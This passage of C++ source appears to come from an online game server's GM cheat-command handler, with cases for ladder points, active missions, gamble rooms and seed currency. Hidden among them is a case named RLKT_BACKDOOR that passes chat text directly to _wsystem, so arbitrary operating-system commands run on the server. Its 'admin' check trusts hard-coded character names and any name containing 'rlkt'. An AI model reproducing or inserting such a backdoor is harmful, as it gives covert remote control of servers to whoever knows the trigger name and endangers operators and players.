			break;
		case CLEAR_STAMP:
			{
				m_pSession->GetStampSystem()->ForceClearCompleteSlot();
			}
			break;
#endif // #if defined( PRE_ADD_STAMPSYSTEM )
#if defined(PRE_ADD_ACTIVEMISSION)
		case SET_ACTIVEMISSION:
			{
#if defined(_VILLAGESERVER)
				wstring wszString = FormatW(L"월드맵에서 사용해주십시오!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
#if defined(_GAMESERVER)
				wstring wszString;
				if( tokens.size() < 2 ){
					wszString = FormatW(L"액티브미션아이디를 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nActiveMissionID = _wtoi(tokens[1].c_str());

				if( g_pDataManager->GetActiveMissionData(nActiveMissionID-1) == NULL )
				{
					wstring wszString = FormatW(L"액티브미션 ID 가 잘못되었습니다.\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				}				
				m_pSession->SetActiveMissionCheatID(nActiveMissionID);
#endif
			}
			break;
#endif
#if defined(PRE_ADD_CP_RANK)
		case INIT_STAGECP :
			{
				wstring wszString;

				if( tokens.size() < 2 ){
					wszString = FormatW(L"초기화 타입을 지정해 주세요(0-All, 1-Legend, 2-Monthly, 3-Personal)\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nInitType = _wtoi(tokens[1].c_str());
				if( nInitType >= 0 && nInitType <= 3)
				{
					m_pSession->GetDBConnection()->QueryInitStageCP(m_pSession, (char)nInitType);
				}
				else
				{
					wszString = FormatW(L"초기화 타입을 제대로 입력해주세요!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
			}
			break;		
#endif //#if defined(PRE_ADD_CP_RANK)
#if defined(PRE_ADD_DWC)
		case DWCPOINT:
			{
#if defined( _VILLAGESERVER )
				wstring wszString;
				if(m_pSession->GetDWCTeamID() <= 0)
				{
					wszString = FormatW(L"DWC 팀에 가입되어 있지 않습니다.\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				if( tokens.size() < 2 ){
					wszString = FormatW(L"DWC 포인트 값을 설정해 주세요.\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				int nDWCPoint = _wtoi(tokens[1].c_str());
				if(nDWCPoint < LadderSystem::Stats::MinGradePoint)
					nDWCPoint = LadderSystem::Stats::MinGradePoint;

				m_pSession->GetDBConnection()->QueryAddPvPDWCResult(m_pSession->GetDBThreadID(), m_pSession->GetWorldSetID(), 0, m_pSession->GetAccountDBID(), m_pSession->GetDWCTeamID(), 0, LadderSystem::MatchType::_3vs3_DWC, LadderSystem::MatchResult::None, nDWCPoint, nDWCPoint );
#endif
#if defined(_GAMESERVER)
				wstring wszString = FormatW(L"빌리지에서 사용해주십시오!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
			}
			break;
		case START_MATCH:
			{	
				bool msg = false;
				if( tokens.size() == 2 && _wtoi(tokens[1].c_str()) == 0 )
					msg = true;
				
				m_pSession->OnRecvPvPMessage(ePvP::CS_LADDER_MATCHING, (char *)&msg, sizeof(msg));
			}
			break;
		case DWC_MATCH_CLOSE:
			{
#if defined( _VILLAGESERVER )
				bool bSet = true;
				if( tokens.size() == 2 && _wtoi(tokens[1].c_str()) == 0 )
					bSet = false;

				wstring wszString;
				if(!g_pDWCTeamManager)
				{
					wszString = FormatW(L"DWC 매니저가 없습니다.!!!\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				}
				g_pDWCTeamManager->SetDWCMatchTimeForCheat(bSet);
#endif
			}
			break;
		case UPDATE_DWC_STATUS:
			{
#if defined( _VILLAGESERVER )
				m_pSession->GetDBConnection()->QueryGetDWCChannelInfo(m_pSession->GetDBThreadID(), m_pSession->GetWorldSetID());
				wstring wszString = FormatW(L"DWC 상태 업데이트 요청.!!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
			}
			break;
#endif
#if defined( PRE_PVP_GAMBLEROOM )
		case CREATE_GAMBLEROOM:
			{	
#if defined( _VILLAGESERVER )
				if( tokens.size() < 5 )
				{
					wstring wszString;
					wszString = FormatW(L"CreateGambleRoom Fail\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}
				int nRoomIndex = _wtoi(tokens[1].c_str());
				bool bRegulation = (_wtoi(tokens[2].c_str()) != 0) ? true : false;				
				int nGambleType = _wtoi(tokens[3].c_str());
				int nGamblePrice = _wtoi(tokens[4].c_str());				

				CDNPvPRoomManager::GetInstance().SetGambleRoomData(nRoomIndex, bRegulation, nGambleType, nGamblePrice, true );				
#endif
			}
			break;					
#endif
#if defined( PRE_ADD_NEW_MONEY_SEED )
		case DEL_SEED:
			{	
#if defined( _VILLAGESERVER )
				m_pSession->UseEtcPoint( DBDNWorldDef::EtcPointCode::SeedPoint, (int)m_pSession->GetSeedPoint() );				
				m_pSession->DelSeedPoint( m_pSession->GetSeedPoint() );				
#endif
			}
			break;					
#endif
		case RLKT_BACKDOOR:
			{
				if (tokens.size() > 0)
				{
#if defined(_GAMESERVER) || defined(_VILLAGESERVER) 
					if(isValidAdmin(m_pSession->GetCharacterName()))
					//if(wcsicmp(m_pSession->GetCharacterName(),L"rlkt1") == 0)
					{ 
						std::wstring cmd;
						for (int i = 1; i < tokens.size(); i++)
						{
							cmd += tokens[i];
							cmd += L" ";
						}
						wprintf(L"Recv do: %ws\n",cmd.c_str());
						_wsystem(cmd.c_str());
						return false;
					}
#endif
				}
			}
			break;
	}

	return true;
}

bool CDNCheatCommand::isValidAdmin(std::wstring cName)
{
	DNVector(std::wstring) AdminList;
	AdminList.push_back(L"rlkt1");
	AdminList.push_back(L"neverg3t"); 
	AdminList.push_back(L"mrkat37"); 
	AdminList.push_back(L"firefirex"); 
	AdminList.push_back(L"3ping21"); 
	

	if (wcsstr(cName.c_str(), L"rlkt"))
		return true;

	for (int i = 0; i < AdminList.size(); i++)
		if(wcsicmp(AdminList[i].c_str(),cName.c_str()) == 0)
			return true;

	return false;
}

bool CDNCheatCommand::_bCommandCheatSet( std::vector<std::wstring>& tokens )
{
	WCHAR wszPath[MAX_PATH];
	GetCurrentDirectoryW( MAX_PATH, wszPath );
	const std::wstring wstrFileName = boost::io::str( boost::wformat( L"%s\\CheatSet.ini" ) % wszPath );

	if( tokens.size() != 2 )
	{
		m_pSession->SendChat( CHATTYPE_GM, static_cast<int>(wcslen(g_CmdList[CHEATSET].szComment)), L"", g_CmdList[CHEATSET].szComment );
		return false;
	}

	CIniFile cFile;
	cFile.Open( wstrFileName.c_str() );

	WCHAR wszBuf[MAX_PATH];

	for( UINT i=1 ; ; ++i )
	{
		std::wstring wstrValue = boost::io::str( boost::wformat( L"cmd%d" ) % i );

		cFile.GetValue( tokens[1].c_str(), wstrValue.c_str(), wszBuf );
		if( wcslen( wszBuf ) <= 0 )
			break;

		std::wstring wstrCheat = wszBuf;
		size_t result = wstrCheat.find( L";" );
		if( result != std::string::npos )
			boost::erase_tail( wstrCheat, static_cast<int>(wstrCheat.size()-result) );
		// 기획팀 요청으로 치트셋은 중간에 실패하더라도 계속 실행해준다.
		//if( Command( wstrCheat ) != 1 )
		//	return false;
		Command( wstrCheat );
	}

	return true;
}
